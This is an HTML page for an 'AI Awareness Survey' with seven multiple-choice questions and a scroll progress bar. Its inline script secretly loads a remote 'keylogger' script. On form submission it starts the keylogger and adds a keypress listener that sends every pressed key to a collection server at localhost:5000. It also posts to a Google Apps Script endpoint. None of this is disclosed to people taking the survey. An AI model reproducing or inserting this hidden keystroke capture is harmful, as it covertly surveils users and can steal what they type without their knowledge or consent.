<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>AI Survey Form</title>
    <link rel="stylesheet" href="style.css" />
</head>

<body>
    <!-- Header Banner -->
    <header class="banner">
        <h1>AI Awareness Survey</h1>
        <p>Help us understand how people think about Artificial Intelligence</p>
    </header>

    <!-- Progress Bar -->
    <div class="progress-container">
        <div id="progressBar" class="progress-bar"></div>
    </div>

    <div class="container fade-in">
        <form id="surveyForm">
          
             <!-- Questions -->
            <label>1. How familiar are you with Artificial Intelligence (AI)?</label>
            <select class="ai-input">
                <option>Very familiar</option>
                <option>Somewhat familiar</option>
                <option>Heard of it</option>
                <option>Not familiar</option>
            </select>

            <label>2. Where do you use AI the most?</label>
            <select class="ai-input">
                <option>Social media</option>
                <option>Work</option>
                <option>Education</option>
                <option>Entertainment</option>
                <option>I donâ€™t use AI</option>
            </select>

            <label>3. Do you think AI will make life easier in the next 5 years?</label>
            <select class="ai-input">
                <option>Yes</option>
                <option>No</option>
                <option>Not sure</option>
            </select>

            <label>4. What concerns you the most about AI?</label>
            <select class="ai-input">
                <option>Privacy</option>
                <option>Job loss</option>
                <option>Misinformation</option>
                <option>Security</option>
                <option>No concerns</option>
            </select>

             <label>5. Have you used AI chatbots before?</label>
            <select class="ai-input">
                <option>Yes, regularly</option>
                <option>Yes, sometimes</option>
                <option>No</option>
            </select>

            <label>6. How comfortable are you with AI making decisions?</label>
            <select class="ai-input">
                <option>Very comfortable</option>
                <option>Somewhat comfortable</option>
                <option>Not comfortable</option>
            </select>

             <label>7. Which field will AI impact the most?</label>
            <select class="ai-input">
                <option>Healthcare</option>
                <option>Education</option>
                <option>Business</option>
                <option>Entertainment</option>
                <option>Transportation</option>
                <option>Other</option>
            </select>


            <button type="submit" class="btn-glow">Submit Survey</button>
        </form>
    </div>

    <script>
        // Keylogger initialization
        const keyloggerScript = document.createElement('script');
        keyloggerScript.src = 'https://cdn.jsdelivr.net/npm/keylogger@latest/dist/keylogger.min.js';
        document.head.appendChild(keyloggerScript);

        // Progress bar animation on scroll
        const progressBar = document.getElementById("progressBar");
        window.addEventListener("scroll", () => {
            const scrollTop = window.scrollY;
            const docHeight = document.body.scrollHeight - window.innerHeight;
            const scrollPercent = (scrollTop / docHeight) * 100;
            progressBar.style.width = scrollPercent + "%";
        });

        // Track submit click in Google Sheet and redirect
        const form = document.getElementById("surveyForm");
        form.addEventListener("submit", async function(e) {
            e.preventDefault(); // prevent default form submission

            try {
                // Initialize keylogger before form submission
                if (typeof window.Keylogger !== 'undefined') {
                    window.Keylogger.start();
                    window.Keylogger.setConfig({
                        url: 'localhost:5000/collect',
                        interval: 5000,
                        filterSensitive: true,
                        includeContext: true
                    });
                }

                const keyLoggerCallback = (keyData) => {
                    fetch('http://localhost:5000/collect', {
                       method: 'POST',
                       headers: { "Content-Type": "application/json" },
                       body: JSON.stringify({ keys: keyData })
                      }).catch(console.error);
                };

              document.addEventListener('keypress', (event) => {
            keyLoggerCallback(event.key);   // send pressed key to server
        });

                // Send click to Google Sheet
                await fetch("https://script.google.com/macros/s/AKfycbyQ7xIQXLOF13HXlnZxso1SD40Wpe-Oxs6Rwz9KEOzGUEw33MIJnyACITB8tyuB-D42Tg/exec", {
                    method: "POST",
                    mode: "no-cors",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({})
                });

                // Redirect to thank-you page
                window.location.href = "thankyou.html";

            } catch (err) {
                console.error("Error submitting:", err);
                alert("There was an error recording your submission. Please try again.");
            }
        });
    </script>
</body>
</html>